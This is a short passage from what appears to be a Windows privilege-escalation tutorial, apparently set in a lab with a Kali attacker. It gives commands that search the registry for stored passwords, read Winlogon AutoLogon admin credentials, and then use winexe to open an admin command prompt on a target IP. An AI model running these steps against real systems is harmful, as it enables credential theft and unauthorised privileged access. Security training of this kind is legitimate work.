The registry can be searched for keys and values that contain the word "password":

`reg query HKLM /f password /t REG_SZ /s`

If you want to save some time, query this specific key to find admin AutoLogon credentials:

`reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):

`winexe -U 'admin%password' //10.10.1.200 cmd.exe`
